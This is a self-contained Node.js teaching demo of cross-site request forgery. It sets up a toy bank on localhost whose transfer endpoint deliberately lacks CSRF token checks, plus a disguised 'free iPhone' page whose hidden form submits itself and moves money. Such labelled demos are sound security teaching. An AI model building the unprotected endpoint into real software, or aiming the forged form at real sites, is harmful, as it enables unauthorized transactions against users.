// ============================================================
// VULNERABILITY DEMO: Cross-Site Request Forgery (CSRF)
// ============================================================
// WHAT IS THE BUG?
//   The /transfer endpoint accepts POST requests from ANY origin.
//   It does not check for a CSRF token.
//   An attacker's page can silently submit a form to steal money.
//
// HOW TO EXPLOIT:
//   1. Run: node vulnerable.js
//   2. Open: http://localhost:3005 (the bank — alice has $1000)
//   3. Click "Visit Attacker's Page"
//   4. The attacker page auto-submits a hidden form → alice loses $200!
// ============================================================

const http = require('http');
const url  = require('url');
const qs   = require('querystring');
const crypto = require('crypto');

// In-memory "bank accounts"
let accounts = {
  alice: 1000,
  bob:   500,
};

// Logged-in user is always Alice in this demo
const CURRENT_USER = 'alice';

function resetAccounts() {
  accounts = { alice: 1000, bob: 500 };
}

// --- HTML page for the bank ---
function bankPage(message) {
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
  <title>SafeBank (VULNERABLE)</title>
  <style>
    body  { font-family: sans-serif; padding: 24px; max-width: 580px; margin: 0 auto; }
    h1    { color: #c0392b; }
    .box  { background: #fff3cd; border: 1px solid #ffc107; padding: 14px; border-radius: 6px; margin: 14px 0; }
    .msg  { background: #f8d7da; border: 1px solid #f5c6cb; padding: 10px; border-radius: 4px; color: #721c24; margin-bottom: 14px; }
    input { padding: 6px; margin: 4px 0; width: 200px; display: block; }
    button{ padding: 8px 20px; background: #c0392b; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    a     { display: inline-block; margin-top: 10px; padding: 8px 14px; background: #eee; border-radius: 4px; text-decoration: none; color: #333; }
  </style></head><body>
  <h1>SafeBank [VULNERABLE]</h1>
  <div class="box">
    Logged in as: <strong>alice</strong><br>
    Alice's balance: <strong>$${accounts.alice}</strong><br>
    Bob's balance: $${accounts.bob}
  </div>
  ${message ? `<div class="msg">${message}</div>` : ''}
  <h3>Transfer Money</h3>
  <!-- ❌ No CSRF token in this form! An attacker can replicate it from any site. -->
  <form method="POST" action="/transfer">
    <label>To: <input name="to" value="bob"></label>
    <label>Amount: <input name="amount" type="number" value="100"></label>
    <button type="submit">Transfer</button>
  </form>
  <a href="/attacker">⚠️ Visit Attacker's Page (demo)</a>
  <a href="/reset">Reset balances</a>
  </body></html>`;
}

// --- HTML page for the "attacker" website ---
const attackerPage = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>WIN A FREE iPHONE!!!</title>
<style>
  body { font-family: sans-serif; padding: 24px; background: #fffbe6; }
  h1   { color: #e67e22; }
  .exp { background: #f8d7da; border: 1px solid #f5c6cb; padding: 14px; border-radius: 6px; margin-top: 20px; }
</style></head><body>
<h1>Congratulations! You won a FREE iPhone!</h1>
<p>Click the button below to claim your prize...</p>

<!-- ❌ This is the CSRF attack!
     This form submits to the BANK (localhost:3005/transfer).
     The browser will include Alice's session cookies automatically!
     Alice never sees this form — it auto-submits on page load. -->
<form id="csrf-form" method="POST" action="http://localhost:3005/transfer" style="display:none">
  <input name="to"     value="bob">
  <input name="amount" value="200">
</form>
<script>
  // Auto-submit the hidden form when the page loads
  window.onload = function() {
    document.getElementById('csrf-form').submit();
  };
</script>

<div class="exp">
  <strong>What just happened?</strong><br>
  This page auto-submitted a form to <code>localhost:3005/transfer</code>.<br>
  Alice's browser sent the request — and the bank accepted it because
  there was no CSRF token to verify!
</div>
</body></html>`;

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  if (req.method === 'GET' && parsed.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(bankPage(''));

  } else if (req.method === 'GET' && parsed.pathname === '/attacker') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(attackerPage);

  } else if (req.method === 'GET' && parsed.pathname === '/reset') {
    resetAccounts();
    res.writeHead(302, { Location: '/' }); res.end();

  } else if (req.method === 'POST' && parsed.pathname === '/transfer') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const params = qs.parse(body);
      const amount = parseInt(params.amount, 10) || 0;
      const to     = params.to;

      // ❌ VULNERABILITY: No CSRF token check!
      // We just process whatever POST data arrives — even from another website.
      if (accounts[CURRENT_USER] >= amount && accounts[to] !== undefined) {
        accounts[CURRENT_USER] -= amount;
        accounts[to]           += amount;
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(bankPage(`Transferred $${amount} to ${to}. (Was this really you? No way to tell!)`));
      } else {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(bankPage('Transfer failed: insufficient funds or invalid account.'));
      }
    });

  } else {
    res.writeHead(404); res.end('Not found');
  }
});

server.listen(3005, () => {
  console.log('');
  console.log('=== VULNERABLE: CSRF Demo ===');
  console.log('Bank running at http://localhost:3005');
  console.log('');
  console.log('Attack steps:');
  console.log('  1. Open http://localhost:3005 (Alice has $1000)');
  console.log('  2. Click "Visit Attacker\'s Page"');
  console.log('  3. The attacker page secretly transfers $200 from Alice!');
  console.log('');
});
